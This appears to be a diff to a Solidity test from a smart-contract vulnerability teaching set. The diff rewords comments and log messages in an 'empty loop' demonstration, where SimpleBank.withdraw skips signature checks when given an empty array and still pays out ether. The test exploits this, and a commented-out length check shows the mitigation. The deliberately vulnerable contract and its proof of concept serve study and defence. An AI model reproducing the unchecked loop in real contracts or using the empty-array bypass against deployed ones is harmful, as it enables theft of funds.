@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 /*
 
-Empty loop: An attacker can simply pass an empty array to bypass the loop & signature verification.
+Empty loop: Due to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.
 
 Mitigation  
 Check the number of signatures  
@@ -30,10 +30,10 @@ contract ContractTest is Test {
         SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input
         //sigs[0] = SimpleBank.Signature("", 0, "", "");
 
-        console.log("Before exploiting, Alice ether balance",address(alice).balance);
+        console.log("Before exploiting, Alice's ether balance",address(alice).balance);
         SimpleBankContract.withdraw(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter
 
-        console.log("Afer exploiting, Alice ether balance",address(alice).balance);
+        console.log("Afer exploiting, Alice's ether balance",address(alice).balance);
     }
 
     receive() external payable {}
@@ -60,7 +60,8 @@ contract SimpleBank {
         //require(sigs.length > 0, "No signatures provided");
         for (uint i = 0; i < sigs.length; i++){
             Signature calldata signature = sigs[i];
-            verifySignatures(signature);
+        // Verify every signature and revert if any of them fails to verify.
+            verifySignatures(signature); 
         }
         payable(msg.sender).transfer(1 ether);
     }
